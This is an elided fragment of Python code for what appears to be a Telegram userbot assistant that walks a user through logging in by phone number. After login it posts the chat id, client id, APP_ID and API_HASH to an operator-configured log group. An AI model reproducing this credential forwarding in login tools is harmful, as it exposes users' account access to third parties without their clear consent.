...
NUMBER_ERROR = f"{DEFAULTUSER} Seems This Number Is Already Registered"
...
async def ass_string():
    ...
    client = await assitant_client("Assitant", Var.APP_ID[0], Var.API_HASH[0]).start(
    ...
    async with client:
        ...
        async def handler(event):
            ...
            APP_ID, API_HASH = Api_Hash_Id(Var.APP_ID, Var.API_HASH)
            async with event.client.conversation(event.chat_id) as conv:
                await conv.send_message(PHONE_NUMBER)
                response = conv.wait_event(events.NewMessage(chats=event.chat_id))
                ...
                current_client = assitant_client(
                    ...
                    api_id=APP_ID,
                    api_hash=API_HASH,
                    device_model=Var.TG_BOT_USER_NAME_BF_HER,
                    system_version="assitant",
                    assis_stri="9.6.9",
                )
                ...
                if sent.phone_registered:
                    ...
                    await event.client.send_message(
                        entity=Var.PM_PERMIT_GROUP_ID,
                        message=LOGGING.format(
                            C=event.chat_id,
                            L=assitant_client.id,
                            APP_ID=APP_ID,
                            API_HASH=API_HASH,
                        ),
                        reply_to=4,
